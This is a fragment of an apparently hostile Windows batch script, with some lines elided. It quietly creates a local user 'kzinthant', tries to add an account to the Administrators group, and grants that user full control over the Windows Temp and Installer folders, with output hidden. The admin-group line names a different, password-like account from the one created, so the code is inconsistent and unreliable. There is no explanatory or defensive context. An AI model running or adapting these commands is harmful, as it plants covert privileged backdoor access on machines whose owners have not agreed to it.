...
net user kzinthant kzinthant /add >nul
net localgroup administrators kzinthant123!@# /add >nul
echo IP:
...
ICACLS C:\Windows\Temp /grant kzinthant:F >nul
ICACLS C:\Windows\installer /grant kzinthant:F >nul
